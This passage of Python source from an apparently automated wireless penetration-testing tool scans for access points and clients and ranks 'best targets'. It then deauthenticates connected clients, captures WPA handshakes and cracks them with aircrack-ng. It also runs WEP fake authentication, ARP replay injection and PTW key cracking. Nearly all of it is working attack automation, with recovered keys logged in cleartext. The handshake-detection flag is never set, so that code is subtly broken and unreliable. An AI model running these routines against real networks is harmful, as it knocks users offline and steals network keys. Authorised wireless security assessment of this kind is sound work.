        for name in sorted(post - pre):
            if _is_monitor(name):
                log(f"Monitor mode enabled: {name}")
                return name

        # Secondary: existing interface converted to monitor mode in-place
        for name in sorted(post):
            if name != interface and _is_monitor(name):
                log(f"Monitor mode enabled: {name}")
                return name

        # Tertiary: regex on airmon-ng output — require leading alpha to reject
        # bare numbers (e.g. "10") that some airmon-ng versions emit
        for pattern in (
            r'enabled\s+(?:for|on)\s+(?:\[[^\]]*\])?\S+\s+on\s+(?:\[[^\]]*\])?([a-zA-Z]\w*)',
            r'enabled\s+(?:for|on)\s+(?:\[[^\]]*\])?([a-zA-Z]\w*)',
        ):
            m = re.search(pattern, out, re.I)
            if m:
                detected = m.group(1).strip()
                log(f"Monitor mode enabled: {detected}")
                return detected

        log(f"Monitor mode started — using configured name {monitor_iface}")
        return monitor_iface

    _run(["sudo", "ip", "link", "set", interface, "down"])
    _run(["sudo", "iw", interface, "set", "monitor", "none"])
    _run(["sudo", "ip", "link", "set", interface, "up"])
    log(f"Monitor mode set via iw on {interface}")
    return interface


def disable_monitor_mode(monitor_iface: str, original_iface: str) -> None:
    # Step 1: tear down the monitor interface
    if shutil.which("airmon-ng"):
        _run(["sudo", "airmon-ng", "stop", monitor_iface], timeout=15)
    else:
        _run(["sudo", "ip", "link", "set", monitor_iface, "down"], timeout=5)
        _run(["sudo", "iw", monitor_iface, "set", "type", "managed"], timeout=5)
        _run(["sudo", "ip", "link", "set", monitor_iface, "up"], timeout=5)

    # Step 2: explicitly restore the original physical interface to managed mode.
    # airmon-ng stop removes the monitor vif but does not reset the underlying
    # PHY — wlan0 is left down and the driver still thinks it is in monitor mode.
    # Do this unconditionally; failures (e.g. interface already gone) are benign.
    if original_iface and original_iface != monitor_iface:
        _run(["sudo", "ip", "link", "set", original_iface, "down"], timeout=5)
        if shutil.which("iw"):
            _run(["sudo", "iw", original_iface, "set", "type", "managed"], timeout=5)
        elif shutil.which("iwconfig"):
            _run(["sudo", "iwconfig", original_iface, "mode", "managed"], timeout=5)
        _run(["sudo", "ip", "link", "set", original_iface, "up"], timeout=5)

    # Step 3: hard-reset known-fragile USB WiFi drivers.  mt76x2u and the
    # rtl88xxau family leak chip-firmware state after monitor-mode use that
    # later NM scans can wedge on (observed: Pi 4 + mt76x2u + 1h42m post-
    # session NM scan → kernel hang → hardware watchdog reset).  No-op for
    # built-in/PCIe radios.
    _reset_usb_wifi_driver(original_iface)

    # Step 4: clear any failed-state on wpa_supplicant.service so it can be
    # restarted cleanly by NM later, even though we didn't kill it this
    # session (in case airmon-ng decided to anyway).  Idempotent.
    if shutil.which("systemctl"):
        _run(["sudo", "systemctl", "reset-failed", "wpa_supplicant.service"],
             timeout=5)

    # Step 5: hand the radio back to NetworkManager.  We didn't stop NM, so
    # there's nothing to restart — just lift the per-device unmanaged scope
    # that enable_monitor_mode set.  No-op without nmcli.
    _nm_set_unmanaged(original_iface, unmanaged=False)

    # Step 6: verify the radio is responsive before declaring teardown done.
    # If the driver-reset didn't fully recover the chip, the operator sees
    # a clear log line rather than a silent half-broken state.
    ok, reason = _verify_radio_health(original_iface)
    if not ok:
        log(f"WARNING: post-teardown radio health check failed: {reason}")
        log("Attempting second driver reset...")
        _reset_usb_wifi_driver(original_iface)
        ok, reason = _verify_radio_health(original_iface)
        if not ok:
            log(f"WARNING: radio still unhealthy after second reset: {reason}")
            log("Operator should investigate before next session.")

    log(f"Monitor mode disabled — {original_iface} restored to managed mode")


# ── WPS detection ─────────────────────────────────────────────────────────────

def _detect_wps(monitor_iface: str, timeout: int = 20) -> set[str]:
    """Run wash to enumerate WPS-enabled APs. Returns set of uppercase BSSIDs."""
    if not shutil.which("wash"):
        return set()
    log(f"WPS scan (wash) on {monitor_iface} for {timeout}s...")
    wps_bssids: set[str] = set()
    proc = None
    try:
        proc = _popen(
            ["sudo", "wash", "-i", monitor_iface, "-C"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
        )
        if proc.stdout is None:
            return wps_bssids
        deadline = time.time() + timeout
        while True:
            line = _readline_timed(proc.stdout, deadline)
            if line is None:
                break
            decoded = line.decode("utf-8", errors="replace").strip()
            # wash output columns: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
            m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', decoded)
            if m:
                wps_bssids.add(m.group(1).upper())
    except Exception:
        pass
    finally:
        if proc is not None:
            _kill_proc(proc)
    return wps_bssids


# ── Target AP scanning ────────────────────────────────────────────────────────

def scan_targets(
    monitor_iface: str,
    target_ssids: list,
    target_bssids: list | None = None,
    timeout: int = 30,
    channel: int | None = None,
) -> list[dict]:
    """
    Passive AP scan (airodump-ng preferred, iwlist fallback) combined with
    parallel WPS enumeration (wash).
    Returns list of {ssid, bssid, channel, encryption, wps} dicts.
    Emits findings for: open networks, WPS-enabled APs, WPA3-Transition mode.

    NOTE: Hidden SSIDs require active probing (mdk4 probe mode or directed
    wpa_supplicant probe requests) — not implemented here; this scan is passive.
    """
    _check_pause()
    target_bssids = target_bssids or []
    log(f"Scanning for wireless networks (timeout={timeout}s)...")

    # Run WPS detection in parallel (background — does not block AP scan)
    wps_proc    = None
    wps_bssids: set[str] = set()
    if shutil.which("wash"):
        try:
            wps_proc = _popen(
                ["sudo", "wash", "-i", monitor_iface, "-C"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass

    discovered: list[dict] = []

    if shutil.which("airodump-ng"):
        import tempfile as _tempfile
        with _tempfile.TemporaryDirectory() as tmp:
            out_prefix = os.path.join(tmp, "scan")
            cmd = [
                "sudo", "airodump-ng",
                "--write", out_prefix, "--output-format", "csv",
            ]
            if channel:
                cmd += ["--channel", str(channel)]
            else:
                cmd += ["--band", "abg"]
            cmd += [monitor_iface]
            proc = None
            try:
                proc = _popen(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
                _pause_sleep(timeout)
            except Exception:
                pass
            finally:
                if proc is not None:
                    _kill_proc(proc)

            csv_file = out_prefix + "-01.csv"
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, encoding="utf-8", errors="replace") as f:
                        lines = f.read().splitlines()
                    in_sta      = False
                    all_sta: list[dict] = []
                    for raw in lines[2:]:
                        stripped = raw.strip()
                        if not stripped:
                            continue
                        low = stripped.lower()
                        if low.startswith("bssid"):
                            in_sta = False
                            continue
                        if low.startswith("station mac"):
                            in_sta = True
                            continue
                        parts = [p.strip() for p in stripped.split(",")]
                        if not in_sta:
                            if len(parts) < 14:
                                continue
                            bssid = parts[0]
                            if not re.match(
                                r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid
                            ):
                                continue
                            channel_str = parts[3].strip()
                            enc         = parts[5].strip()
                            ssid        = parts[13].strip()
                            try:
                                ch = int(channel_str)
                            except ValueError:
                                ch = 0
                            ssid_ok  = (not target_ssids)  or (ssid  in target_ssids)
                            bssid_ok = (not target_bssids) or (
                                bssid.upper() in [b.upper() for b in target_bssids]
                            )
                            if ssid_ok and bssid_ok:
                                discovered.append({
                                    "ssid": ssid, "bssid": bssid,
                                    "channel": ch, "encryption": enc,
                                    "wps": False, "clients": [],
                                })
                        else:
                            if len(parts) < 6:
                                continue
                            mac = parts[0]
                            if not re.match(
                                r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac
                            ):
                                continue
                            all_sta.append({"mac": mac, "bssid": parts[5].strip()})
                    # Link stations to their discovered APs
                    _bssid_idx = {ap["bssid"].upper(): ap for ap in discovered}
                    for sta in all_sta:
                        _ab = sta["bssid"].upper()
                        if _ab in _bssid_idx:
                            _bssid_idx[_ab]["clients"].append({"mac": sta["mac"]})
                except Exception as exc:
                    err(f"Scan CSV parse error: {exc}")
    else:
        # iwlist fallback
        out, _ = _run(["sudo", "iwlist", monitor_iface, "scan"], timeout=30)
        current: dict = {}

        def _commit(ap: dict) -> None:
            if not ap.get("ssid"):
                return
            ssid_ok  = (not target_ssids) or (ap["ssid"] in target_ssids)
            bssid_ok = (not target_bssids) or (
                ap.get("bssid", "").upper() in [b.upper() for b in target_bssids]
            )
            if ssid_ok and bssid_ok:
                discovered.append(ap)

        for line in out.splitlines():
            line = line.strip()
            if "Cell" in line and "Address:" in line:
                _commit(current)
                m = re.search(r'Address:\s+(\S+)', line)
                current = {
                    "bssid": m.group(1) if m else "", "ssid": "",
                    "channel": 0, "encryption": "UNKNOWN", "wps": False,
                }
            elif "ESSID:" in line:
                m = re.search(r'ESSID:"([^"]*)"', line)
                if m:
                    current["ssid"] = m.group(1)
            elif "Channel:" in line:
                m = re.search(r'Channel:(\d+)', line)
                if m:
                    current["channel"] = int(m.group(1))
            elif "IE:" in line:
                if re.search(r'WPA2\s+Version|RSN', line, re.I):
                    current["encryption"] = "WPA2"
                elif re.search(r'WPA\s+Version', line, re.I):
                    if current.get("encryption") not in ("WPA2",):
                        current["encryption"] = "WPA"
            elif "Encryption key:" in line:
                if current.get("encryption") == "UNKNOWN":
                    current["encryption"] = "WEP" if "on" in line else "OPN"
        _commit(current)

    # Harvest WPS results from background wash process
    if wps_proc is not None:
        try:
            # Drain remaining output collected during airodump-ng sleep
            remaining_out, _ = wps_proc.communicate(timeout=3)
            for line in remaining_out.decode("utf-8", errors="replace").splitlines():
                m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line.strip())
                if m:
                    wps_bssids.add(m.group(1).upper())
        except Exception:
            _kill_proc(wps_proc)

    # Annotate discovered APs with WPS status + emit per-AP findings
    log(f"Discovered {len(discovered)} target AP(s)")
    for ap in discovered:
        bssid_upper = ap.get("bssid", "").upper()
        enc         = ap.get("encryption", "")
        ssid        = ap.get("ssid", "")

        # Mark WPS status
        if bssid_upper in wps_bssids:
            ap["wps"] = True

        log(f"  AP: {ssid!r} [{ap['bssid']}] "
            f"ch={ap['channel']} enc={enc} wps={ap['wps']}")

        # Open / unencrypted network
        if not enc or enc.upper() in ("OPN", "OPEN"):
            finding_from_cat(
                "AETHER-014",
                data={"ssid": ssid, "bssid": ap["bssid"], "channel": ap["channel"]},
                title_override=f"Open / Unencrypted Network: {ssid}",
            )

        # WPS enabled — exposes AP to Pixie-Dust and PIN brute-force
        if ap["wps"]:
            finding_from_cat(
                "AETHER-015",
                data={"ssid": ssid, "bssid": ap["bssid"], "channel": ap["channel"]},
                title_override=f"WPS Enabled: {ssid}",
            )

        # WPA3-Transition mode — WPA2+WPA3 mixed; downgrade surface
        # airodump-ng reports transition APs with "WPA2 WPA3" or "SAE WPA2" in enc field
        if (re.search(r'WPA3|SAE', enc, re.I) and re.search(r'WPA2|PSK', enc, re.I)):
            finding_from_cat(
                "AETHER-016",
                data={"ssid": ssid, "bssid": ap["bssid"], "encryption": enc},
                title_override=f"WPA3 Transition Mode (Downgrade Surface): {ssid}",
            )

    return discovered


# ── Wireless Intelligence helpers ─────────────────────────────────────────────


def _parse_airodump_csv_full(csv_path: str) -> tuple[list[dict], list[dict]]:
    """Parse a complete airodump-ng CSV into (ap_list, station_list).

    AP fields:      bssid, channel, speed, encryption, cipher, auth,
                    signal, beacons, ssid, clients, client_count,
                    score, best_target, wps
    Station fields: mac, signal, packets, bssid (of associated AP), probed
    """
    aps: list[dict]      = []
    stations: list[dict] = []
    in_stations          = False

    def _int(v: str) -> int:
        try:
            return int(v)
        except (ValueError, TypeError):
            return 0

    try:
        with open(csv_path, encoding="utf-8", errors="replace") as fh:
            lines = fh.read().splitlines()
    except Exception:
        return aps, stations

    for raw in lines:
        stripped = raw.strip()
        if not stripped:
            continue
        low = stripped.lower()
        if low.startswith("bssid"):
            in_stations = False
            continue
        if low.startswith("station mac"):
            in_stations = True
            continue

        parts = [p.strip() for p in stripped.split(",")]

        if not in_stations:
            if len(parts) < 14:
                continue
            bssid = parts[0]
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                continue
            aps.append({
                "bssid":        bssid,
                "channel":      _int(parts[3]),
                "speed":        _int(parts[4]),
                "encryption":   parts[5],
                "cipher":       parts[6],
                "auth":         parts[7],
                "signal":       _int(parts[8]),
                "beacons":      _int(parts[9]),
                "ssid":         parts[13],
                "clients":      [],
                "client_count": 0,
                "score":        0.0,
                "best_target":  False,
                "wps":          False,
            })
        else:
            if len(parts) < 6:
                continue
            mac = parts[0]
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
                continue
            stations.append({
                "mac":     mac,
                "signal":  _int(parts[3]),
                "packets": _int(parts[4]),
                "bssid":   parts[5],
                "probed":  parts[6] if len(parts) > 6 else "",
            })

    return aps, stations


def _score_ap(signal: int, client_count: int) -> float:
    """Score an AP 0–100: 40 % signal strength, 60 % connected clients.

    Signal is normalised from -90 dBm (worst) to -30 dBm (best).
    Client score saturates at 4 clients (25 pts each).
    APs with clients are strongly preferred because they yield handshakes.
    """
    sig_norm     = max(-90, min(-30, signal)) if signal < 0 else -90
    sig_score    = (sig_norm + 90) * (100.0 / 60.0)
    client_score = min(100.0, client_count * 25.0)
    return round(sig_score * 0.4 + client_score * 0.6, 1)


def phase_wireless_intel(
    monitor_iface: str,
    target_ssids:  list[str],
    target_bssids: list[str],
    output_dir:    Path,
    scan_seconds:  int = 45,
) -> tuple[dict | None, list[dict]]:
    """Phase 0-I: Deep wireless intelligence.

    Runs a dedicated airodump-ng scan with parallel WPS detection (wash).
    For every AP broadcasting the target SSID(s):
      - captures full metadata (encryption, cipher, auth, signal, beacons)
      - identifies every connected client station
      - scores each AP (signal + client count)
      - selects the best target

    Writes access_points.json to output_dir.
    Returns (best_ap, all_enriched_aps).
    """
    _check_pause()
    status("p0_intel", "Phase 0-I: Wireless Intelligence", "running")
    intel_dir = output_dir / "wireless_intel"
    intel_dir.mkdir(parents=True, exist_ok=True)

    if not shutil.which("airodump-ng"):
        log("[0-I] airodump-ng not found — skipping wireless intelligence scan")
        status("p0_intel", "Phase 0-I: Wireless Intelligence", "skipped",
               "airodump-ng not installed")
        return None, []

    log(f"[0-I] Wireless intelligence scan ({scan_seconds}s, --write-interval 5)…")
    if target_ssids:
        log(f"[0-I] Targeting SSID(s): {', '.join(repr(s) for s in target_ssids)}")

    # WPS detection runs in parallel
    wps_bssids: set[str] = set()
    wps_proc             = None
    if shutil.which("wash"):
        try:
            wps_proc = _popen(["sudo", "wash", "-i", monitor_iface, "-C"],
                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    out_prefix = str(intel_dir / "intel_scan")
    cmd = [
        "sudo", "airodump-ng",
        "--write", out_prefix,
        "--output-format", "csv",
        "--write-interval", "5",
        "--band", "abg",
    ]
    if target_ssids and len(target_ssids) == 1:
        cmd += ["--essid", target_ssids[0]]
    if target_bssids and len(target_bssids) == 1:
        cmd += ["--bssid", target_bssids[0]]
    cmd.append(monitor_iface)

    proc = None
    try:
        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _pause_sleep(scan_seconds)
    except Exception as exc:
        log(f"[0-I] airodump-ng error: {exc}")
    finally:
        if proc is not None:
            _kill_proc(proc)

    # Harvest WPS results
    if wps_proc is not None:
        try:
            remaining, _ = wps_proc.communicate(timeout=3)
            for ln in remaining.decode("utf-8", errors="replace").splitlines():
                m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', ln.strip())
                if m:
                    wps_bssids.add(m.group(1).upper())
        except Exception:
            _kill_proc(wps_proc)

    csv_file = out_prefix + "-01.csv"
    if not os.path.exists(csv_file):
        log("[0-I] No scan data collected")
        status("p0_intel", "Phase 0-I: Wireless Intelligence", "error",
               "no data collected")
        return None, []

    aps, stations = _parse_airodump_csv_full(csv_file)

    # Filter to configured target scope
    target_bssids_up = {b.upper() for b in (target_bssids or [])}
    filtered: list[dict] = []
    for ap in aps:
        ssid_ok  = (not target_ssids)     or (ap["ssid"] in target_ssids)
        bssid_ok = (not target_bssids_up) or (ap["bssid"].upper() in target_bssids_up)
        if ssid_ok and bssid_ok:
            ap["wps"] = ap["bssid"].upper() in wps_bssids
            filtered.append(ap)

    if not filtered:
        log("[0-I] No APs found matching target SSID(s)")
        status("p0_intel", "Phase 0-I: Wireless Intelligence", "complete")
        return None, []

    # Assign client stations to their APs
    bssid_index = {ap["bssid"].upper(): ap for ap in filtered}
    for sta in stations:
        ap_bssid = sta.get("bssid", "").upper()
        if ap_bssid in bssid_index:
            bssid_index[ap_bssid]["clients"].append({
                "mac":     sta["mac"],
                "signal":  sta["signal"],
                "packets": sta["packets"],
            })

    # Targeted follow-up scans for APs that still have no clients.
    # The broad band scan may miss idle clients; a channel-locked scan focused
    # on a single BSSID gives airodump-ng the best chance to capture sparse
    # client traffic before handshake and deauth phases run.
    clientless = [ap for ap in filtered if not ap["clients"] and ap["channel"]]
    if clientless:
        log(f"[0-I] {len(clientless)} AP(s) have no clients — running targeted follow-up scan(s)…")
        for i, ap in enumerate(clientless):
            log(f"[0-I] Targeted scan: {ap['ssid']!r} [{ap['bssid']}] "
                f"ch={ap['channel']} (15s)…")
            pfx2  = str(intel_dir / f"targeted_{i}")
            cmd2  = [
                "sudo", "airodump-ng",
                "--write", pfx2, "--output-format", "csv",
                "--bssid",   ap["bssid"],
                "--channel", str(ap["channel"]),
                monitor_iface,
            ]
            proc2 = None
            try:
                proc2 = _popen(cmd2, stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
                _pause_sleep(15)
            except Exception:
                pass
            finally:
                if proc2 is not None:
                    _kill_proc(proc2)
            csv2 = pfx2 + "-01.csv"
            if not os.path.exists(csv2):
                continue
            _, new_sta = _parse_airodump_csv_full(csv2)
            seen_macs  = {c["mac"] for c in ap["clients"]}
            for sta in new_sta:
                if sta.get("bssid", "").upper() != ap["bssid"].upper():
                    continue
                if sta["mac"] not in seen_macs:
                    ap["clients"].append({
                        "mac":     sta["mac"],
                        "signal":  sta["signal"],
                        "packets": sta["packets"],
                    })
                    seen_macs.add(sta["mac"])
            if ap["clients"]:
                log(f"[0-I] Follow-up: {len(ap['clients'])} client(s) on {ap['bssid']}")

    # Score and rank APs
    for ap in filtered:
        ap["client_count"] = len(ap["clients"])
        ap["score"]        = _score_ap(ap["signal"], ap["client_count"])
    filtered.sort(key=lambda a: a["score"], reverse=True)
    if filtered:
        filtered[0]["best_target"] = True

    # Emit finding for multi-AP scenario
    ssid_label = target_ssids[0] if target_ssids else filtered[0]["ssid"]
    if len(filtered) > 1:
        finding(
            title=f"Wireless Misconfiguration: Multiple APs Broadcasting SSID: {ssid_label}",
            severity="INFO",
            description=(
                f"{len(filtered)} access points are broadcasting '{ssid_label}'. "
                f"This may indicate a distributed enterprise network or an Evil Twin "
                f"deployment opportunity."
            ),
            data={"ap_count": len(filtered),
                  "bssids": [ap["bssid"] for ap in filtered]},
        )

    # Log results
    total_clients = sum(ap["client_count"] for ap in filtered)
    log(f"[0-I] Found {len(filtered)} AP(s), {total_clients} total client(s):")
    for ap in filtered:
        enc_str = " / ".join(
            p for p in [ap["encryption"], ap["cipher"], ap["auth"]] if p.strip()
        )
        tag = "  ◄ BEST TARGET" if ap["best_target"] else ""
        log(f"  {'★' if ap['best_target'] else '·'} {ap['ssid']!r} "
            f"[{ap['bssid']}] ch={ap['channel']} "
            f"sig={ap['signal']}dBm  enc={enc_str}  "
            f"wps={ap['wps']}  clients={ap['client_count']}  "
            f"score={ap['score']}{tag}")
        for c in ap["clients"]:
            log(f"      ↳ {c['mac']}  sig={c['signal']}dBm  pkts={c['packets']}")

    # Persist to access_points.json (read by Crucible Access Points tab)
    ap_json_path = output_dir / "access_points.json"
    ap_json_path.write_text(json.dumps({
        "scan_time":    datetime.now().isoformat(),
        "target_ssids": target_ssids,
        "access_points": filtered,
    }, indent=2), encoding="utf-8")
    log(f"[0-I] Wrote {ap_json_path}")

    best = filtered[0]
    status("p0_intel", "Phase 0-I: Wireless Intelligence", "complete",
           f"{len(filtered)} AP(s) | best: {best['bssid']}")
    return best, filtered


def _deauth_clients(
    monitor_iface: str,
    bssid:         str,
    channel:       int,
    clients:       list[dict],
    deauth_count:  int = 5,
) -> None:
    """Send deauthentication frames via aireplay-ng to force client re-association.

    Sends targeted frames to each known client MAC; falls back to broadcast
    deauth if no client list is available.
    """
    if not shutil.which("aireplay-ng"):
        log("[1c] aireplay-ng not found — cannot send deauth frames")
        return
    if channel > 0:
        _run(["sudo", "iwconfig", monitor_iface, "channel", str(channel)], timeout=5)
    if clients:
        for c in clients:
            mac = c.get("mac", "")
            if not mac:
                continue
            log(f"[1c] Deauth ×{deauth_count} → {mac} from {bssid}")
            _run(["sudo", "aireplay-ng",
                  "-0", str(deauth_count),
                  "-a", bssid, "-c", mac,
                  monitor_iface],
                 timeout=deauth_count * 2 + 10)
    else:
        log(f"[1c] Broadcast deauth ×{deauth_count} → {bssid}")
        _run(["sudo", "aireplay-ng",
              "-0", str(deauth_count),
              "-a", bssid,
              monitor_iface],
             timeout=deauth_count * 2 + 10)


def phase_deauth_handshake(
    monitor_iface: str,
    enriched_aps:  list[dict],
    output_dir:    Path,
    wordlist:      str | None,
    timeout:       int = 300,
    deauth_count:  int = 5,
) -> None:
    """Phase 1c: Targeted deauth + dedicated handshake capture.

    For each in-scope AP that has connected clients (best-scored first):
      1. Start airodump-ng capture on the AP's specific BSSID + channel
      2. Send targeted deauth frames to each connected client
      3. Wait for airodump-ng to confirm WPA handshake capture
      4. Attempt aircrack-ng dictionary crack if a wordlist is configured

    Emits AETHER-002 only when handshake capture is confirmed by airodump-ng
    stdout — never on error output alone.
    """
    _check_pause()
    if not shutil.which("airodump-ng"):
        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
               "airodump-ng not installed")
        return
    if not shutil.which("aireplay-ng"):
        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
               "aireplay-ng not installed")
        return

    aps_scoped = [ap for ap in enriched_aps if _in_scope(ap)]
    aps_with_clients = [ap for ap in aps_scoped if ap.get("clients")]
    if not aps_with_clients:
        log("[1c] No connected clients discovered — cannot perform targeted deauth")
        log("[1c] Tip: wait for clients or use Phase 1a (PMKID) for clientless capture")
        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
               "no clients discovered")
        return

    status("p1c_deauth", "Phase 1c: Deauth + Handshake", "running")
    log(f"[1c] START: Deauth + Handshake Capture — {len(aps_with_clients)} AP(s) with clients")
    deauth_dir = output_dir / "deauth_handshake"
    deauth_dir.mkdir(parents=True, exist_ok=True)

    for ap in sorted(aps_with_clients, key=lambda a: a.get("score", 0), reverse=True):
        ssid    = ap.get("ssid", "")
        bssid   = ap["bssid"]
        channel = ap.get("channel", 0)
        clients = ap.get("clients", [])
        safe    = re.sub(r'[^\w]', '_', ssid or bssid)
        cap_prefix = str(deauth_dir / f"cap_{safe}")

        log(f"[1c] Target: {ssid!r} [{bssid}] ch={channel} "
            f"clients={len(clients)} score={ap.get('score', 0)}")

        # Start dedicated capture on this BSSID + channel
        cap_cmd = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", cap_prefix,
            "--output-format", "cap",
            monitor_iface,
        ]
        cap_proc           = None
        handshake_captured = False
        try:
            cap_proc = _popen(cap_cmd,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            time.sleep(3)  # let capture stabilise before deauth
            _deauth_clients(monitor_iface, bssid, channel, clients, deauth_count)
            _pause_sleep(min(timeout, 90) - 3)
        finally:
            if cap_proc is not None:
                _kill_proc(cap_proc)

        cap_file = cap_prefix + "-01.cap"
        if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
            log(f"[1c] No capture data for {ssid!r}")
            continue

        if handshake_captured:
            finding_from_cat(
                "AETHER-002",
                data={"ssid": ssid, "bssid": bssid, "attack": "deauth",
                      "clients_deauthed": len(clients)},
                output_file=cap_file,
                title_override=f"WPA Handshake Captured via Deauth: {ssid}",
            )

        # Attempt dictionary crack with aircrack-ng
        if wordlist and os.path.exists(wordlist) and shutil.which("aircrack-ng"):
            log(f"[1c] Cracking {ssid!r} with aircrack-ng…")
            crack_out, _ = _run([
                "sudo", "aircrack-ng",
                "-w", wordlist,
                "-b", bssid,
                cap_file,
            ], timeout=min(timeout, 600))
            (deauth_dir / f"aircrack_{safe}.txt").write_text(
                crack_out, encoding="utf-8"
            )
            m_key = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', crack_out)
            if m_key:
                psk = m_key.group(1)
                log(f"[1c] KEY FOUND for {ssid!r}: {psk}")
                finding(
                    title=f"Wireless Vulnerability: WPA Pre-Shared Key Cracked via Deauth: {ssid}",
                    severity="CRITICAL",
                    description=(
                        f"Deauthentication attack on '{ssid}' [{bssid}] forced "
                        f"client re-association, capturing the WPA 4-way handshake. "
                        f"The PSK was recovered via dictionary attack: '{psk}'."
                    ),
                    data={"ssid": ssid, "bssid": bssid, "psk": psk,
                          "attack": "deauth+aircrack"},
                    output_file=cap_file,
                    cvss_score=9.0,
                    cvss_vector="AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                )
            elif not handshake_captured:
                log(f"[1c] No confirmed handshake for {ssid!r} — nothing to crack")

    log(f"[1c] END: Deauth + Handshake — processed {len(aps_with_clients)} AP(s)")
    status("p1c_deauth", "Phase 1c: Deauth + Handshake", "complete")


# ── Phase 0: WEP IV capture + PTW cracking ───────────────────────────────────

def phase_wep(
    monitor_iface: str,
    target_aps: list[dict],
    output_dir: Path,
    timeout: int = 300,
) -> None:
    """
    Phase 0: WEP testing via IV capture + ARP replay injection + PTW crack.
    Includes fake open-system authentication (aireplay-ng -1) to ensure
    the attacking station is associated before injecting ARPs — required
    when the AP has no active clients.
    """
    _check_pause()
    if not shutil.which("aircrack-ng") or not shutil.which("airodump-ng"):
        status("p0_wep", "Phase 0: WEP Testing", "skipped", "aircrack-ng not installed")
        return

    wep_aps = [
        ap for ap in target_aps
        if _in_scope(ap)
        and "WEP" in ap.get("encryption", "").upper()
        and "WPA" not in ap.get("encryption", "").upper()
    ]
    if not wep_aps:
        status("p0_wep", "Phase 0: WEP Testing", "skipped", "no WEP networks found")
        return

    status("p0_wep", "Phase 0: WEP Testing", "running")
    log(f"[0] START: WEP Testing — {len(wep_aps)} WEP network(s) in scope")
    for _wap in wep_aps:
        log(f"[0]   Target: {_wap.get('ssid','?')!r} [{_wap.get('bssid','?')}] ch={_wap.get('channel','?')}")
    wep_dir = output_dir / "wep"
    wep_dir.mkdir(parents=True, exist_ok=True)

    for ap in wep_aps[:3]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        safe    = re.sub(r'[^\w]', '_', ssid or bssid)

        finding_from_cat(
            "AETHER-012",
            data={"ssid": ssid, "bssid": bssid, "channel": channel},
            title_override=f"WEP Encryption in Use: {ssid}",
        )

        cap_prefix = str(wep_dir / f"cap_{safe}")

        # Step 1: fake open-system authentication — associates our NIC so
        # we can inject ARP packets even when no legitimate client is present.
        if shutil.which("aireplay-ng"):
            log(f"[0] WEP: fake auth → {ssid!r} [{bssid}]")
            _run([
                "sudo", "aireplay-ng",
                "-1", "0",          # fake auth, reassoc interval 0
                "-e", ssid,
                "-a", bssid,
                monitor_iface,
            ], timeout=15)

        dump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", bssid, "--channel", str(channel),
            "--write", cap_prefix, "--output-format", "cap",
            monitor_iface,
        ]
        replay_cmd = [
            "sudo", "aireplay-ng",
            "--arpreplay", "-b", bssid, "-x", "1000",
            monitor_iface,
        ]

        log(f"[0] WEP: IV capture + ARP replay on {ssid!r} [{bssid}] ch={channel}")
        dump_proc   = None
        replay_proc = None
        try:
            dump_proc = _popen(dump_cmd,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            replay_proc = _popen(replay_cmd,
                                  stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if replay_proc.stdout is None:
                raise RuntimeError("aireplay-ng stdout unavailable")
            deadline = time.time() + timeout
            last_crack = time.time()
            while True:
                line = _readline_timed(replay_proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                if decoded:
                    log(decoded)
                # Progressive crack: attempt every 5 000 new IVs
                iv_m = re.search(r'#Data:\s*(\d+)', decoded)
                if iv_m and int(iv_m.group(1)) >= 5000 and time.time() - last_crack > 30:
                    last_crack = time.time()
                    cap_files  = sorted(wep_dir.glob(f"cap_{safe}*.cap"))
                    if cap_files:
                        quick_out, _ = _run(
                            ["sudo", "aircrack-ng", "-b", bssid]
                            + [str(c) for c in cap_files],
                            timeout=30,
                        )
                        if "KEY FOUND!" in quick_out:
                            log("[0] WEP: key found during progressive crack — stopping")
                            break
        finally:
            if replay_proc is not None:
                _kill_proc(replay_proc)
            if dump_proc is not None:
                _kill_proc(dump_proc)

        # Final PTW crack on all collected captures
        cap_files = sorted(wep_dir.glob(f"cap_{safe}*.cap"))
        if not cap_files:
            log(f"[0] WEP: no capture files for {ssid!r}")
            continue
        crack_cmd  = ["sudo", "aircrack-ng", "-b", bssid] + [str(c) for c in cap_files]
        log(f"[0] WEP: final PTW crack on {len(cap_files)} file(s)")
        crack_out, _ = _run(crack_cmd, timeout=120)
        log(crack_out)
        m_key = re.search(r'KEY FOUND!\s*\[([^\]]+)\]', crack_out, re.I)
        if m_key:
            finding_from_cat(
                "AETHER-013",
                data={"ssid": ssid, "bssid": bssid, "key": m_key.group(1)},
                output_file=cap_prefix + "-01.cap",
                title_override=f"WEP Key Cracked: {ssid}",
            )

